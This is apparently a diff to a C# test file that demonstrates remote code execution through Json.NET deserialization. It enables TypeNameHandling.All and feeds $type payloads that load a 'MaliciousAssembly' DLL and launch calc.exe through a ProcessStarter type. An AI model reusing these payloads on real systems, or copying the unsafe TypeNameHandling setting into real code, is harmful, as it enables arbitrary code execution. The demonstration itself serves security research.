@@ -27,6 +27,12 @@ namespace SerializationRCE
             "Path":"MaliciousAssembly.dll"}           
             """;
 
+        string maliciousAssemblyLaunchPayload = """
+            {"$type":"MaliciousAssembly.ProcessStarter, MaliciousAssembly",
+            "ProcessLaunch":"calc.exe"
+            }
+            """;
+
         [Fact]
         public void FileInfoJson()
         {
@@ -36,8 +42,6 @@ namespace SerializationRCE
             serializerSettings.TypeNameHandling = TypeNameHandling.All;
 
             object? returnClass = JsonConvert.DeserializeObject(filePayload, serializerSettings);
-
-
         }
 
 
@@ -48,6 +52,17 @@ namespace SerializationRCE
             serializerSettings.TypeNameHandling = TypeNameHandling.All;
 
             object? returnClass = JsonConvert.DeserializeObject(assemblyPayloadSimple, serializerSettings);
+        }
+
+        [Fact]
+        public void MaliciousAssemblyLauncherJson()
+        {
+            JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
+            serializerSettings.TypeNameHandling = TypeNameHandling.All;
+
+            object? installer = JsonConvert.DeserializeObject(assemblyPayloadSimple, serializerSettings);
+
+            object? returnClass = JsonConvert.DeserializeObject(maliciousAssemblyLaunchPayload, serializerSettings);
         }
 
     }
